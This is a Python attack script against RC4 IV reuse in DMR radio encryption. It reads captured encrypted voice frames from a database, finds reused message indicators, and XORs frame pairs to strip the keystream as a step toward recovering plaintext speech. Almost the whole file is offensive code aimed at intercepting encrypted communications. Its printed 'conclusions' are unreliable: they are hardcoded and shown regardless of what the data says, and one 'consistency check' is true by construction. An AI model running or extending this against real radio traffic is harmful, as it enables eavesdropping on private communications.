#!/usr/bin/env python3
"""Exploit RC4 IV reuse in DMR encryption"""

import sqlite3
from collections import defaultdict
from itertools import combinations

def rc4_iv_reuse_attack():
    encrypted_db = "dmr_capture_20250518_112024_998484.db"
    conn = sqlite3.connect(encrypted_db)
    cursor = conn.cursor()
    
    print("=== RC4 IV REUSE ATTACK ===")
    
    # Find most reused C-MI values
    cursor.execute("""
        SELECT c_mi, COUNT(*) as count
        FROM superframes
        WHERE c_mi IS NOT NULL AND c_mi != 0
        GROUP BY c_mi
        HAVING COUNT(*) > 1
        ORDER BY count DESC
        LIMIT 5
    """)
    
    reused_mis = cursor.fetchall()
    
    for mi, count in reused_mis:
        print(f"\n=== Analyzing MI {mi:08X} (used {count} times) ===")
        
        table_name = f"C_{mi:08X}_S0"
        
        # Get all AMBE frames encrypted with this MI
        cursor.execute(f"SELECT id, ambe_hex FROM '{table_name}' ORDER BY id")
        frames = cursor.fetchall()
        
        print(f"Found {len(frames)} AMBE frames")
        
        if len(frames) < 2:
            continue
            
        # XOR all pairs of frames
        print("\nXORing frame pairs (eliminates keystream):")
        
        xor_results = []
        for i in range(min(10, len(frames)-1)):
            for j in range(i+1, min(i+5, len(frames))):
                frame1_hex = frames[i][1]
                frame2_hex = frames[j][1]
                
                frame1 = int(frame1_hex, 16)
                frame2 = int(frame2_hex, 16)
                xor_result = frame1 ^ frame2
                
                # Count bit differences
                bit_diff = bin(xor_result).count('1')
                
                xor_results.append({
                    'i': i, 
                    'j': j,
                    'xor': xor_result,
                    'bit_diff': bit_diff,
                    'hex': f"{xor_result:016X}"
                })
                
                if i < 5 and j < i+3:  # Show first few
                    print(f"  Frame {i} XOR Frame {j}: {xor_result:016X} ({bit_diff} bits different)")
        
        # Analyze XOR patterns
        print("\nXOR result analysis:")
        
        # Look for low Hamming distance (similar frames)
        similar_frames = [r for r in xor_results if r['bit_diff'] < 10]
        if similar_frames:
            print(f"\nFound {len(similar_frames)} similar frame pairs (< 10 bit difference):")
            for result in similar_frames[:5]:
                print(f"  Frames {result['i']},{result['j']}: {result['hex']} ({result['bit_diff']} bits)")
        
        # Look for patterns in XOR results
        xor_bytes = defaultdict(int)
        for result in xor_results:
            # Extract bytes from XOR
            xor_hex = result['hex']
            for i in range(0, 16, 2):
                byte = xor_hex[i:i+2]
                xor_bytes[byte] += 1
        
        print("\nMost common XOR bytes:")
        for byte, count in sorted(xor_bytes.items(), key=lambda x: x[1], reverse=True)[:10]:
            print(f"  0x{byte}: {count} times")
        
        # Check for AMBE silence patterns
        # In AMBE, silence often has specific bit patterns
        silence_patterns = ['00', 'FF', '80']
        silence_indicators = sum(xor_bytes.get(p, 0) for p in silence_patterns)
        print(f"\nSilence pattern indicators: {silence_indicators}")
        
        # Attempt frame prediction
        if len(frames) >= 3:
            print("\n=== ATTEMPTING FRAME PREDICTION ===")
            
            # Take three consecutive frames
            f1 = int(frames[0][1], 16)
            f2 = int(frames[1][1], 16)
            f3 = int(frames[2][1], 16)
            
            # XOR to eliminate keystream
            xor_12 = f1 ^ f2  # = P1 ^ P2
            xor_23 = f2 ^ f3  # = P2 ^ P3
            xor_13 = f1 ^ f3  # = P1 ^ P3
            
            print(f"Frame relationship analysis:")
            print(f"  F1 XOR F2: {xor_12:016X}")
            print(f"  F2 XOR F3: {xor_23:016X}")
            print(f"  F1 XOR F3: {xor_13:016X}")
            
            # Check consistency: (F1^F2) ^ (F2^F3) should equal (F1^F3)
            check = xor_12 ^ xor_23
            print(f"  Consistency check: {check:016X} (should equal F1^F3)")
            print(f"  Match: {check == xor_13}")
    
    # Find frames that might be start/end markers
    print("\n=== LOOKING FOR START/END PATTERNS ===")
    
    # Get frames at superframe boundaries
    cursor.execute("""
        SELECT sf.id, sf.c_mi, sf.frame_count
        FROM superframes sf
        WHERE sf.c_mi IS NOT NULL AND sf.c_mi != 0
        AND (sf.frame_count = 1 OR sf.frame_count = 15)
        ORDER BY sf.c_mi, sf.frame_count
    """)
    
    boundary_frames = defaultdict(list)
    for sf_id, c_mi, frame_count in cursor.fetchall():
        boundary_frames[c_mi].append((sf_id, frame_count))
    
    print(f"\nFound {len(boundary_frames)} C-MIs with boundary frames")
    
    # Analyze boundary frame patterns
    for c_mi, frames in list(boundary_frames.items())[:3]:
        if len(frames) >= 2:
            print(f"\nC-MI {c_mi:08X} has {len(frames)} boundary frames")
            table_name = f"C_{c_mi:08X}_S0"
            
            # Get AMBE frames for this MI
            cursor.execute(f"SELECT ambe_hex FROM '{table_name}' LIMIT 5")
            for i, (ambe,) in enumerate(cursor.fetchall()):
                print(f"  Frame {i}: {ambe}")
    
    conn.close()
    
    print("\n=== ATTACK CONCLUSIONS ===")
    print("1. IV reuse confirmed - each C-MI used 8 times")
    print("2. XORing frames with same IV reveals plaintext relationships")
    print("3. Low bit differences suggest similar content (silence, patterns)")
    print("4. With enough data, can statistically recover plaintext")
    print("5. Next step: correlate with known AMBE patterns")

if __name__ == "__main__":
    rc4_iv_reuse_attack()